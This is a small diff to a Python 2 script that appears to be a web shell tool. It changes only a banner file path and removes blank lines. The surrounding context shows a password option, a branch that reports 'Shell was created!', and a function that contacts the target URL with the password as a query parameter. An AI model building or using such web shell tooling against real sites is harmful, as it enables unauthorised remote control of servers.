@@ -18,7 +18,7 @@ parser.add_argument("-p", help="Password")
 args = parser.parse_args()
 #BANNER 
 print "\n"   
-for line in open("banner.txt"):
+for line in open("extras/banner.txt"):
 	print line,
 print "\n"   
 print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
@@ -48,8 +48,6 @@ if args.g and args.p:
 			sys.exit(1)
 	print('Shell was created!')
 	sys.exit(1)
-
-
 
 def conect():
 	targer = urllib.urlopen(url+"?pass="+args.p)
